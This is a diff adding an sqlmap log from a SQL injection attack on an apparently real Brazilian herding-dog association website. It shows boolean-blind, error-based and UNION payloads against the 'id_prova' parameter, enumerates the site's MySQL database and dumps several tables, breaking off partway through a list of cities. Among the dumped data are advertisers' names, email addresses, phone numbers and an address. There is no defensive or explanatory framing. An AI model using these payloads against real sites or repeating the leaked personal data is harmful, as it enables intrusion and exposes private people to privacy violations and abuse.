@@ -1,0 +1,1208 @@
+sqlmap identified the following injection point(s) with a total of 184 HTTP(s) requests:
+---
+Parameter: id_prova (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: view=detalhesprova&id_prova=21 AND 9893=9893
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: view=detalhesprova&id_prova=21 AND (SELECT 8198 FROM(SELECT COUNT(*),CONCAT(0x71706b6271,(SELECT (ELT(8198=8198,1))),0x71706a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: view=detalhesprova&id_prova=21 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706b6271,0x6646466e4e717a6965546b4646447a75577a706b7045736b644b68494654496478516e52495a7877,0x71706a7071)-- erFE
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] leonard5_appas
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_prova (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: view=detalhesprova&id_prova=21 AND 9893=9893
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: view=detalhesprova&id_prova=21 AND (SELECT 8198 FROM(SELECT COUNT(*),CONCAT(0x71706b6271,(SELECT (ELT(8198=8198,1))),0x71706a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: view=detalhesprova&id_prova=21 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706b6271,0x6646466e4e717a6965546b4646447a75577a706b7045736b644b68494654496478516e52495a7877,0x71706a7071)-- erFE
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: leonard5_appas
+[47 tables]
++-------------------------+
+| albuns                  |
+| albuns_midias           |
+| anuncios                |
+| cachorros               |
+| cachorros_meu           |
+| cachorros_treinamento   |
+| cachorros_venda         |
+| cidades                 |
+| classificados           |
+| clientes                |
+| cobrancas               |
+| contratos               |
+| cursos                  |
+| estados                 |
+| faturas                 |
+| fornecedores            |
+| galeria_midias          |
+| informacoes_diretoria   |
+| informacoes_site        |
+| inscricao               |
+| lancamentos             |
+| lancamentos_fixos       |
+| midia_itens             |
+| midias                  |
+| ninhadas                |
+| niveis_acesso           |
+| noticias                |
+| pedidos                 |
+| pedidos_produtos        |
+| pessoas                 |
+| produtos                |
+| produtos_categorias     |
+| produtos_modelos        |
+| produtos_sub_categorias |
+| provas                  |
+| ranking                 |
+| usuarios                |
+| usuarios_acessos        |
+| videos_youtube          |
+| vw_album_midia          |
+| vw_cachorros            |
+| vw_clientes             |
+| vw_contratos            |
+| vw_faturas              |
+| vw_fornecedores         |
+| vw_lancamentos          |
+| vw_usuarios             |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_prova (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: view=detalhesprova&id_prova=21 AND 9893=9893
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: view=detalhesprova&id_prova=21 AND (SELECT 8198 FROM(SELECT COUNT(*),CONCAT(0x71706b6271,(SELECT (ELT(8198=8198,1))),0x71706a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: view=detalhesprova&id_prova=21 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71706b6271,0x6646466e4e717a6965546b4646447a75577a706b7045736b644b68494654496478516e52495a7877,0x71706a7071)-- erFE
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: leonard5_appas
+[47 tables]
++-------------------------+
+| albuns                  |
+| albuns_midias           |
+| anuncios                |
+| cachorros               |
+| cachorros_meu           |
+| cachorros_treinamento   |
+| cachorros_venda         |
+| cidades                 |
+| classificados           |
+| clientes                |
+| cobrancas               |
+| contratos               |
+| cursos                  |
+| estados                 |
+| faturas                 |
+| fornecedores            |
+| galeria_midias          |
+| informacoes_diretoria   |
+| informacoes_site        |
+| inscricao               |
+| lancamentos             |
+| lancamentos_fixos       |
+| midia_itens             |
+| midias                  |
+| ninhadas                |
+| niveis_acesso           |
+| noticias                |
+| pedidos                 |
+| pedidos_produtos        |
+| pessoas                 |
+| produtos                |
+| produtos_categorias     |
+| produtos_modelos        |
+| produtos_sub_categorias |
+| provas                  |
+| ranking                 |
+| usuarios                |
+| usuarios_acessos        |
+| videos_youtube          |
+| vw_album_midia          |
+| vw_cachorros            |
+| vw_clientes             |
+| vw_contratos            |
+| vw_faturas              |
+| vw_fornecedores         |
+| vw_lancamentos          |
+| vw_usuarios             |
++-------------------------+
+
+Database: leonard5_appas
+Table: albuns
+[6 entries]
++----------+----------+---------------------------------------------------------+-------------------------------------------------------+------------+
+| id_album | id_midia | nome                                                    | texto                                                 | data_album |
++----------+----------+---------------------------------------------------------+-------------------------------------------------------+------------+
+| 13       | 92       | Campeões 1ª Etapa Rebanho Ovino - Pirajuí/SP APPAS 2015 | <blank>                                               | 2015-04-24 |
+| 14       | 93       | Clínicas e cursos com Julie Hill                        |  Clínicas e cursos com Julie Hill                     | 2015-04-24 |
+| 15       | 109      | Campeões 3ª Etapa Rebanho Ovinos - Piranguçu/MG APPAS   | NULL                                                  | <blank>    |
+| 16       | 123      | 5ª e 6ª Etapas Campeonato Paulista de Pastoreio         | NULL                                                  | 2015-09-12 |
+| 17       | 133      | Cão do Futuro e 1ª Etapa Ovinos 2016 - Unimar           | Foi realizado no mês de fevereiro, nos dias 25 e 26 o | 2016-02-28 |
+| 18       | 137      | 1ª e 2ª Etapas Rebanho Bovinos - 2016 - Gouvelândia/GO  | NULL                                                  | 2016-05-30 |
++----------+----------+---------------------------------------------------------+-------------------------------------------------------+------------+
+
+Database: leonard5_appas
+Table: albuns_midias
+[155 entries]
++----------------+--------------+
+| id_album_midia | nome         |
++----------------+--------------+
+| 1              | Album Padrão |
+| 2              | Album Padrão |
+| 3              | Album Padrão |
+| 4              | Album Padrão |
+| 5              | Album Padrão |
+| 6              | Album Padrão |
+| 7              | Album Padrão |
+| 8              | Album Padrão |
+| 9              | Album Padrão |
+| 10             | Album Padrão |
+| 11             | Album Padrão |
+| 12             | Album Padrão |
+| 13             | Album Padrão |
+| 14             | Album Padrão |
+| 15             | Album Padrão |
+| 16             | Album Padrão |
+| 17             | Album Padrão |
+| 18             | Album Padrão |
+| 19             | Album Padrão |
+| 20             | Album Padrão |
+| 21             | Album Padrão |
+| 22             | Album Padrão |
+| 23             | Album Padrão |
+| 24             | Album Padrão |
+| 25             | Album Padrão |
+| 26             | Album Padrão |
+| 27             | Album Padrão |
+| 28             | Album Padrão |
+| 29             | Album Padrão |
+| 30             | Album Padrão |
+| 31             | Album Padrão |
+| 32             | Album Padrão |
+| 33             | Album Padrão |
+| 34             | Album Padrão |
+| 35             | Album Padrão |
+| 36             | Album Padrão |
+| 37             | Album Padrão |
+| 38             | Album Padrão |
+| 39             | Album Padrão |
+| 40             | Album Padrão |
+| 41             | Album Padrão |
+| 42             | Album Padrão |
+| 43             | Album Padrão |
+| 44             | Album Padrão |
+| 45             | Album Padrão |
+| 46             | Album Padrão |
+| 47             | Album Padrão |
+| 48             | Album Padrão |
+| 49             | Album Padrão |
+| 50             | Album Padrão |
+| 51             | Album Padrão |
+| 52             | Album Padrão |
+| 53             | Album Padrão |
+| 54             | Album Padrão |
+| 55             | Album Padrão |
+| 56             | Album Padrão |
+| 57             | Album Padrão |
+| 58             | Album Padrão |
+| 59             | Album Padrão |
+| 60             | Album Padrão |
+| 61             | Album Padrão |
+| 62             | Album Padrão |
+| 63             | Album Padrão |
+| 64             | Album Padrão |
+| 65             | Album Padrão |
+| 66             | Album Padrão |
+| 67             | Album Padrão |
+| 68             | Album Padrão |
+| 69             | Album Padrão |
+| 70             | Album Padrão |
+| 71             | Album Padrão |
+| 72             | Album Padrão |
+| 73             | Album Padrão |
+| 74             | Album Padrão |
+| 75             | Album Padrão |
+| 76             | Album Padrão |
+| 77             | Album Padrão |
+| 78             | Album Padrão |
+| 79             | Album Padrão |
+| 80             | Album Padrão |
+| 81             | Album Padrão |
+| 82             | Album Padrão |
+| 83             | Album Padrão |
+| 84             | Album Padrão |
+| 85             | Album Padrão |
+| 86             | Album Padrão |
+| 87             | Album Padrão |
+| 88             | Album Padrão |
+| 89             | Album Padrão |
+| 90             | Album Padrão |
+| 91             | Album Padrão |
+| 92             | Album Padrão |
+| 93             | Album Padrão |
+| 94             | Album Padrão |
+| 95             | Album Padrão |
+| 96             | Album Padrão |
+| 97             | Album Padrão |
+| 98             | Album Padrão |
+| 99             | Album Padrão |
+| 100            | Album Padrão |
+| 101            | Album Padrão |
+| 102            | Album Padrão |
+| 103            | Album Padrão |
+| 104            | Album Padrão |
+| 105            | Album Padrão |
+| 106            | Album Padrão |
+| 107            | Album Padrão |
+| 108            | Album Padrão |
+| 109            | Album Padrão |
+| 110            | Album Padrão |
+| 111            | Album Padrão |
+| 112            | Album Padrão |
+| 113            | Album Padrão |
+| 114            | Album Padrão |
+| 115            | Album Padrão |
+| 116            | Album Padrão |
+| 117            | Album Padrão |
+| 118            | Album Padrão |
+| 119            | Album Padrão |
+| 120            | Album Padrão |
+| 121            | Album Padrão |
+| 122            | Album Padrão |
+| 123            | Album Padrão |
+| 124            | Album Padrão |
+| 125            | Album Padrão |
+| 126            | Album Padrão |
+| 127            | Album Padrão |
+| 128            | Album Padrão |
+| 129            | Album Padrão |
+| 130            | Album Padrão |
+| 131            | Album Padrão |
+| 132            | Album Padrão |
+| 133            | Album Padrão |
+| 134            | Album Padrão |
+| 135            | Album Padrão |
+| 136            | Album Padrão |
+| 137            | Album Padrão |
+| 138            | Album Padrão |
+| 139            | Album Padrão |
+| 140            | Album Padrão |
+| 141            | Album Padrão |
+| 142            | Album Padrão |
+| 143            | Album Padrão |
+| 144            | Album Padrão |
+| 145            | Album Padrão |
+| 146            | Album Padrão |
+| 147            | Album Padrão |
+| 148            | Album Padrão |
+| 149            | Album Padrão |
+| 150            | Album Padrão |
+| 151            | Album Padrão |
+| 152            | Album Padrão |
+| 153            | Album Padrão |
+| 154            | Album Padrão |
+| 155            | Album Padrão |
++----------------+--------------+
+
+Database: leonard5_appas
+Table: anuncios
+[6 entries]
++----------+------------+----------------+------------------------------+--------------------------+---------------+----------------------------------+---------------------------------------------------------+-------------+--------------+----------------+
+| id_midia | id_anuncio | nome           | site                         | email                    | telefone      | endereco                         | descricao                                               | periodo_fim | responsavel  | periodo_inicio |
++----------+------------+----------------+------------------------------+--------------------------+---------------+----------------------------------+---------------------------------------------------------+-------------+--------------+----------------+
+| 102      | 16         | Sitio Cadupe   | www.facebook.com/Sitiocadupe | pedro_lotufo@hotmail.com | 12997813110   | Praça Monsenhor Silva Barros, 01 | Centro de treinamento, cria e recria de Border Colliese | <blank>     | PEDRO LOTUFO | 2015-06-18     |
+| 103      | 17         | Neto Nanni     | <blank>                      | neto_nanni@hotmail.com   | 018-996250799 | <blank>                          |                                                         | <blank>     | NETO NANNI   | 2015-06-18     |
+| 104      | 18         | Leandro Santos | <blank>                      | <blank>                  | <blank>       | <blank>                          |                                                         | <blank>     | <blank>      | 2015-06-19     |
+| 105      | 19         | Anuncie aqui 4 | <blank>                      | <blank>                  | <blank>       | <blank>                          | NULL                                                    | <blank>     | <blank>      | <blank>        |
+| 106      | 20         | Anuncie aqui 5 | <blank>                      | <blank>                  | <blank>       | <blank>                          | NULL                                                    | <blank>     | <blank>      | <blank>        |
+| 107      | 21         | Anuncie aqui 6 | <blank>                      | <blank>                  | <blank>       | <blank>                          | NULL                                                    | <blank>     | <blank>      | <blank>        |
++----------+------------+----------------+------------------------------+--------------------------+---------------+----------------------------------+---------------------------------------------------------+-------------+--------------+----------------+
+
+Database: leonard5_appas
+Table: cachorros
+[14 entries]
++----------+-----------+-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------+-----------------------------+-------+---------------+------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id_midia | id_pessoa | id_cachorro | mae                                                             | pai                                                                   | nome                        | sexo  | dnacea        | registro               | data_nasc  | descricao                                                                                                                                                                                                                                          |
++----------+-----------+-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------+-----------------------------+-------+---------------+------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 23       | 10        | 23          | Donna                                                           | Tuco                                                                  | LOKO(LUQUE)                 | Macho | Normal        | ISDS                   | 2010-10-23 | Loko campeão gaúcho novatos ovinos 2013, terceiro lugar brasileiro novatos ovinos 2013, campeão gaúcho ranch ovinos 2014, terceiro lugar brasileiro rancho ovinos 2014.                                                                            |
+| 24       | 10        | 24          | QUINCY CARACU DO IPE (LAD OROITE X LICA BCKTABOGA)              | ZAC OROITE (SNIPP TABOGA X SALLY OROITE)                              | KRIS BC-SN JUCKA PITANGA    | Femea | Normal        | ISDS e CBKC            | 2009-12-20 | Kris vice campeã brasileira novatos 2012, campeã gaucha ranch ovinos e bovinos 2013, terceiro lugar brasileiro ranch bovinos 2013. Atualmente correndo Open bovinos e ovinos.                                                                      |
+| 25       | 10        | 25          | AIKA                                                            | NUCK(DINO)                                                            | BELLA                       | Femea | Não informado | ISDS                   | 2013-02-27 | Bela é filha do Dino x Ayka, mostra grande potencial para as grandes provas de pastoreio, em breve vai iniciar no Campeonato Gaúcho.                                                                                                               |
+| 26       | 10        | 26          | IPE LARA (IMP. RANOR X DOT OROITE)                              | ZAC OROITE (SNIPP TABOGA X SALLY OROITE)                              | FLY BC-SN JUCKA PITANGA     | Femea | Não informado | ISDS e CBKC            | 2006-10-15 | Fly vice campeã gaúcha ranch 2010, corre open e vem obtendo excelentes resultados. Em sua primeira cria produziu 3 excelentes cães, Shaulin(Sítio Bons Ventos), Athos campeão gaúcho novatos ovinos 2014 e Aya campeã gaúcha novatos bovinos 2014. |
+| 27       | 10        | 27          | Gaya                                                            | Jim                                                                   | RUá                         | Macho | Não informado | ISDS                   | 2013-12-24 | Ruá chegou para nós sem treinamento, iniciamos ele do                                                                                                                                                                                              |
+| 34       | 10        | 28          | Elza                                                            | Zac                                                                   | OBRYAN JUCKA PITANGA (GURI) | Macho | Não informado | CBKC                   | 2011-08-21 | Vice-Campeão Novatos Ovinos 2014 no campeonato Gaúcho; Quinto lugar na categoria novatos Ovinos no Campeonato Brasileiro                                                                                                                           |
+| 38       | 10        | 29          | MEGA SAO MIGUEL ARCANJO (KINLOCH CIAN X FLOSS OF LITTLE RANCH)  | JAFF (MIRK X GILL)                                                    | GARY AZUL DO VACARIA (ROY)  | Macho | Não informado | CBKC(RS/MSA/12/41471)  | 2012-07-19 | JAFF X MEGA SAO MIGUEL ARCANJO                                                                                                                                                                                                                     |
+| 39       | 10        | 30          | FLECHA OF LITTLE RANCH (DAP OROITE X FLY OF LITTLE RANCH)       | RUDY 254 BR ENCRUZILHADA DO SUL (FRANK OF LITTLE RANCH X NINA BCC-76) | GURIA PASTORES DO CERRADO   | Femea | Não informado | CBKC(RS/SPS/11/39957)  | 2011-09-20 | RUDY X FLECHA                                                                                                                                                                                                                                      |
+| 40       | 10        | 31          | GURIA PASTORES DO CERRADO (RUDY X FLECHA)                       | GARY AZUL DO VACARIA (JAFF X MEGA SAO MIGUEL ARCANJO)                 | VANNY                       | Femea | Não informado | CBKC                   | 2014-11-24 | FILHOTE A VENDA. ROY X GURIA                                                                                                                                                                                                                       |
+| 42       | 10        | 32          | BOCAINAS BORDERS ASIA (CARACU DO IPE YLEX X ZFOCKINHA BOCAINAS) | ROPPER OF LITTLE RANCH (OZ DO BRATISLAVA X LINE BCKTABOGA)            | GIGANTE (VENDIDO)           | Macho | Não informado | CBKC                   | 2014-02-09 | Gigante, vendido para Bernardo Portela de Palmeira das Missoões/RS.                                                                                                                                                                                |
+| 43       | 10        | 33          | Sly                                                             | Dusky                                                                 | SABRE (VENDIDO)             | Macho | Não informado | AMBC                   | 2013-07-22 | Sabre, vendido para Benedito Jr. Porto Alegre/RS                                                                                                                                                                                                   |
+| 44       | 10        | 34          | NIP BECO DO POETA (IPE INCA CARACU DO IPE X MEG 008 DO SD DOG)  | EDI BR BC COUNTRY RANCH (CROSSFIRESWEEP X BABY 015 RC)                | BINGO E.S (VENDIDO)         | Macho | Não informado | CBKC (RS/SPY/12/41817) | 2012-07-27 | Bingo, vendido para São Sepé/RS                                                                                                                                                                                                                    |
+| 45       | 10        | 35          | DELL (ROCK x MEG)                                               | BEN (MAC 276484 x DOT 260561)                                         | TAURA                       | Femea | Não informado | CBKC                   | 2014-02-05 | A mãe da Taura é a Dell. A Dell foi especialmente selecionada pelo David Rees, da criação de seu amigo Gareth Davies, pois tem em seu sangue muita genética da criação do David, como o grande SID do Jim Croopper. Já opai                        |
+| 47       | 10        | 36          | <blank>                                                         | <blank>                                                               | AAAAAAAAA                   | Macho | Não informado | <blank>                | <blank>    | <blank>                                                                                                                                                                                                                                            |
++----------+-----------+-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------+-----------------------------+-------+---------------+------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: leonard5_appas
+Table: cachorros_meu
+[10 entries]
++-------------+-----------------+
+| id_cachorro | id_cachorro_meu |
++-------------+-----------------+
+| 17          | 1               |
+| 18          | 2               |
+| 22          | 3               |
+| 23          | 4               |
+| 24          | 5               |
+| 25          | 6               |
+| 26          | 7               |
+| 29          | 8               |
+| 30          | 9               |
+| 36          | 10              |
++-------------+-----------------+
+
+Database: leonard5_appas
+Table: cachorros_treinamento
+[4 entries]
++----------+-------------+-------------------------+
+| id_midia | id_cachorro | id_cachorro_treinamento |
++----------+-------------+-------------------------+
+| 3        | 16          | 1                       |
+| 6        | 19          | 2                       |
+| 7        | 20          | 3                       |
+| 27       | 27          | 4                       |
++----------+-------------+-------------------------+
+
+Database: leonard5_appas
+Table: cachorros_venda
+[7 entries]
++-------------+-------------------+---------+
+| id_cachorro | id_cachorro_venda | valor   |
++-------------+-------------------+---------+
+| 21          | 1                 | 2332.00 |
+| 28          | 2                 | 5000.00 |
+| 31          | 3                 | 1500.00 |
+| 32          | 4                 | 3000.00 |
+| 33          | 5                 | 3000.00 |
+| 34          | 6                 | 3000.00 |
+| 35          | 7                 | 1500.00 |
++-------------+-------------------+---------+
+
+Database: leonard5_appas
+Table: cidades
+[297 entries]
++-----------------+-----------+-----------+
+| cid_nome        | id_cidade | id_estado |
++-----------------+-----------+-----------+
+| Acrelândia      | 1         | 1         |
+| Brasiléia       | 3         | 1         |
+| Bujari          | 4         | 1         |
+| Capixaba        | 5         | 1         |
+| Epitaciolândia  | 7         | 1         |
+| Feijó           | 8         | 1         |
+| Jordão          | 9         | 1         |
+| Tarauacá        | 21        | 1         |
+| Xapuri          | 22        | 1         |
+| Anadia          | 24        | 2         |
+| Arapiraca       | 25        | 2         |
+| Atalaia         | 26        | 2         |
+| Batalha         | 29        | 2         |
+| Belém           | 30        | 2         |
+| Branquinha      | 33        | 2         |
+| Cacimbinhas     | 34        | 2         |
+| Cajueiro        | 35        | 2         |
+| Campestre       | 36        | 2         |
+| Canapi          | 39        | 2         |
+| Capela          | 40        | 2         |
+| Carneiros       | 41        | 2         |
+| Coruripe        | 46        | 2         |
+| Craíbas         | 47        | 2         |
+| Flexeiras       | 53        | 2         |
+| Ibateguara      | 55        | 2         |
+| Igaci           | 56        | 2         |
+| Inhapi          | 58        | 2         |
+| Jacuípe         | 60        | 2         |
+| Japaratinga     | 61        | 2         |
+| Jaramataia      | 62        | 2         |
+| Jundiá          | 65        | 2         |
+| Junqueiro       | 66        | 2         |
+| Maceió          | 69        | 2         |
+| Maragogi        | 72        | 2         |
+| Maravilha       | 73        | 2         |
+| Maribondo       | 75        | 2         |
+| Messias         | 78        | 2         |
+| Monteirópolis   | 80        | 2         |
+| Murici          | 81        | 2         |
+| Olivença        | 86        | 2         |
+| Palestina       | 88        | 2         |
+| Pariconha       | 91        | 2         |
+| Paripueira      | 92        | 2         |
+| Penedo          | 95        | 2         |
+| Piaçabuçu       | 96        | 2         |
+| Pilar           | 97        | 2         |
+| Pindoba         | 98        | 2         |
+| Piranhas        | 99        | 2         |
+| Quebrangulo     | 104       | 2         |
+| Roteiro         | 106       | 2         |
+| Satuba          | 117       | 2         |
+| Taquarana       | 120       | 2         |
+| Traipu          | 122       | 2         |
+| Viçosa          | 124       | 2         |
+| Alvarães        | 125       | 3         |
+| Amaturá         | 126       | 3         |
+| Anamã           | 127       | 3         |
+| Anori           | 128       | 3         |
+| Apuí            | 129       | 3         |
+| Autazes         | 131       | 3         |
+| Barcelos        | 132       | 3         |
+| Barreirinha     | 133       | 3         |
+| Beruri          | 135       | 3         |
+| Borba           | 138       | 3         |
+| Caapiranga      | 139       | 3         |
+| Canutama        | 140       | 3         |
+| Carauari        | 141       | 3         |
+| Careiro         | 142       | 3         |
+| Coari           | 144       | 3         |
+| Codajás         | 145       | 3         |
+| Eirunepé        | 146       | 3         |
+| Envira          | 147       | 3         |
+| Guajará         | 149       | 3         |
+| Humaitá         | 150       | 3         |
+| Ipixuna         | 151       | 3         |
+| Iranduba        | 152       | 3         |
+| Itacoatiara     | 153       | 3         |
+| Itamarati       | 154       | 3         |
+| Itapiranga      | 155       | 3         |
+| Japurá          | 156       | 3         |
+| Juruá           | 157       | 3         |
+| Jutaí           | 158       | 3         |
+| Lábrea          | 159       | 3         |
+| Manacapuru      | 160       | 3         |
+| Manaquiri       | 161       | 3         |
+| Manaus          | 162       | 3         |
+| Manicoré        | 163       | 3         |
+| Maraã           | 164       | 3         |
+| Maués           | 165       | 3         |
+| Nhamundá        | 166       | 3         |
+| Parintins       | 170       | 3         |
+| Pauini          | 171       | 3         |
+| Silves          | 179       | 3         |
+| Tabatinga       | 180       | 3         |
+| Tapauá          | 181       | 3         |
+| Tefé            | 182       | 3         |
+| Tonantins       | 183       | 3         |
+| Uarini          | 184       | 3         |
+| Urucará         | 185       | 3         |
+| Urucurituba     | 186       | 3         |
+| Amapá           | 187       | 4         |
+| Calçoene        | 188       | 4         |
+| Cutias          | 189       | 4         |
+| Itaubal         | 191       | 4         |
+| Macapá          | 193       | 4         |
+| Mazagão         | 194       | 4         |
+| Oiapoque        | 195       | 4         |
+| Pracuúba        | 198       | 4         |
+| Santana         | 199       | 4         |
+| Tartarugalzinho | 201       | 4         |
+| Abaíra          | 203       | 5         |
+| Abaré           | 204       | 5         |
+| Acajutiba       | 205       | 5         |
+| Adustina        | 206       | 5         |
+| Aiquara         | 208       | 5         |
+| Alagoinhas      | 209       | 5         |
+| Alcobaça        | 210       | 5         |
+| Almadina        | 211       | 5         |
+| Amargosa        | 212       | 5         |
+| Anagé           | 215       | 5         |
+| Andaraí         | 216       | 5         |
+| Andorinha       | 217       | 5         |
+| Angical         | 218       | 5         |
+| Anguera         | 219       | 5         |
+| Antas           | 220       | 5         |
+| Aporá           | 223       | 5         |
+| Apuarema        | 224       | 5         |
+| Araças          | 225       | 5         |
+| Aracatu         | 226       | 5         |
+| Araci           | 227       | 5         |
+| Aramari         | 228       | 5         |
+| Arataca         | 229       | 5         |
+| Aratuípe        | 230       | 5         |
+| Baianópolis     | 232       | 5         |
+| Banzaê          | 234       | 5         |
+| Barra           | 235       | 5         |
+| Barreiras       | 240       | 5         |
+| Barrocas        | 242       | 5         |
+| Belmonte        | 244       | 5         |
+| Biritinga       | 246       | 5         |
+| Boninal         | 251       | 5         |
+| Bonito          | 252       | 5         |
+| Boquira         | 253       | 5         |
+| Botuporã        | 254       | 5         |
+| Brejões         | 255       | 5         |
+| Brejolândia     | 256       | 5         |
+| Brumado         | 258       | 5         |
+| Buerarema       | 259       | 5         |
+| Buritirama      | 260       | 5         |
+| Caatiba         | 261       | 5         |
+| Cachoeira       | 263       | 5         |
+| Caculé          | 264       | 5         |
+| Caém            | 265       | 5         |
+| Caetanos        | 266       | 5         |
+| Caetité         | 267       | 5         |
+| Cafarnaum       | 268       | 5         |
+| Cairu           | 269       | 5         |
+| Camacan         | 271       | 5         |
+| Camaçari        | 272       | 5         |
+| Camamu          | 273       | 5         |
+| Canápolis       | 276       | 5         |
+| Canarana        | 277       | 5         |
+| Canavieiras     | 278       | 5         |
+| Candeal         | 279       | 5         |
+| Candeias        | 280       | 5         |
+| Candiba         | 281       | 5         |
+| Cansanção       | 283       | 5         |
+| Canudos         | 284       | 5         |
+| Caraíbas        | 287       | 5         |
+| Caravelas       | 288       | 5         |
+| Carinhanha      | 290       | 5         |
+| Catolândia      | 293       | 5         |
+| Catu            | 294       | 5         |
+| Caturama        | 295       | 5         |
+| Central         | 296       | 5         |
+| Chorrochó       | 297       | 5         |
+| Cipó            | 299       | 5         |
+| Coaraci         | 300       | 5         |
+| Cocos           | 301       | 5         |
+| Conde           | 306       | 5         |
+| Condeúba        | 307       | 5         |
+| Cordeiros       | 310       | 5         |
+| Coribe          | 311       | 5         |
+| Correntina      | 313       | 5         |
+| Cotegipe        | 314       | 5         |
+| Cravolândia     | 315       | 5         |
+| Crisópolis      | 316       | 5         |
+| Cristópolis     | 317       | 5         |
+| Curaçá          | 319       | 5         |
+| Encruzilhada    | 325       | 5         |
+| Esplanada       | 328       | 5         |
+| Eunápolis       | 330       | 5         |
+| Fátima          | 331       | 5         |
+| Filadélfia      | 334       | 5         |
+| Gandu           | 338       | 5         |
+| Gavião          | 339       | 5         |
+| Glória          | 341       | 5         |
+| Gongogi         | 342       | 5         |
+| Guajeru         | 344       | 5         |
+| Guanambi        | 345       | 5         |
+| Guaratinga      | 346       | 5         |
+| Heliópolis      | 347       | 5         |
+| Iaçu            | 348       | 5         |
+| Ibiassucê       | 349       | 5         |
+| Ibicaraí        | 350       | 5         |
+| Ibicoara        | 351       | 5         |
+| Ibicuí          | 352       | 5         |
+| Ibipeba         | 353       | 5         |
+| Ibipitanga      | 354       | 5         |
+| Ibiquera        | 355       | 5         |
+| Ibirapitanga    | 356       | 5         |
+| Ibirapuã        | 357       | 5         |
+| Ibirataia       | 358       | 5         |
+| Ibitiara        | 359       | 5         |
+| Ibititá         | 360       | 5         |
+| Ibotirama       | 361       | 5         |
+| Ichu            | 362       | 5         |
+| Igaporã         | 363       | 5         |
+| Igrapiúna       | 364       | 5         |
+| Iguaí           | 365       | 5         |
+| Ilhéus          | 366       | 5         |
+| Inhambupe       | 367       | 5         |
+| Ipecaetá        | 368       | 5         |
+| Ipiaú           | 369       | 5         |
+| Ipirá           | 370       | 5         |
+| Ipupiara        | 371       | 5         |
+| Irajuba         | 372       | 5         |
+| Iramaia         | 373       | 5         |
+| Iraquara        | 374       | 5         |
+| Irará           | 375       | 5         |
+| Irecê           | 376       | 5         |
+| Itabela         | 377       | 5         |
+| Itaberaba       | 378       | 5         |
+| Itabuna         | 379       | 5         |
+| Itacaré         | 380       | 5         |
+| Itaeté          | 381       | 5         |
+| Itagi           | 382       | 5         |
+| Itagibá         | 383       | 5         |
+| Itagimirim      | 384       | 5         |
+| Itajuípe        | 387       | 5         |
+| Itamaraju       | 388       | 5         |
+| Itamari         | 389       | 5         |
+| Itambé          | 390       | 5         |
+| Itanagra        | 391       | 5         |
+| Itanhém         | 392       | 5         |
+| Itaparica       | 393       | 5         |
+| Itapé           | 394       | 5         |
+| Itapebi         | 395       | 5         |
+| Itapetinga      | 396       | 5         |
+| Itapicuru       | 397       | 5         |
+| Itapitanga      | 398       | 5         |
+| Itaquara        | 399       | 5         |
+| Itarantim       | 400       | 5         |
+| Itatim          | 401       | 5         |
+| Itiruçu         | 402       | 5         |
+| Itiúba          | 403       | 5         |
+| Itororó         | 404       | 5         |
+| Ituaçu          | 405       | 5         |
+| Ituberá         | 406       | 5         |
+| Iuiú            | 407       | 5         |
+| Jaborandi       | 408       | 5         |
+| Jacaraci        | 409       | 5         |
+| Jacobina        | 410       | 5         |
